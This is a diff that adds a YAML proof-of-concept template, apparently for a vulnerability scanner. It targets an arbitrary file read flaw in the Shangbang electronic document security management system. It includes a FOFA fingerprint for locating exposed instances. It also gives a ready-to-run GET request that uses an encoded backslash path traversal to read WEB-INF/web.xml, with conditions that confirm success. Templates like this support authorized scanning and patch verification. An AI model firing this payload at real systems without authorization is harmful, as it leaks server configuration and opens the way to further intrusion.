@@ -1,0 +1,19 @@
+id: poc-yaml-shangbang-edsms-skins-anyfile-read
+info:
+  name: 上邦电子文档安全管理系统 skins 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 上邦电子文档安全管理系统
+  fofa: body="docsafe/docsafe.nocache.js"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"电子文档安全管理系统")
+- method: GET
+  path: /docsafe/sc/skins/..%5C..%5C..%5CWEB-INF%5Cweb.xml
+  expression: "status_code == 200 && \ncontains(body,\"web-app\") &&\ncontains(body,\"\
+    <param-name>\") &&\ncontains(body,\"<servlet-name>\") &&\ncontains(content_type,\"\
+    application/xml\")\n"
+variables: {}
+transport: http
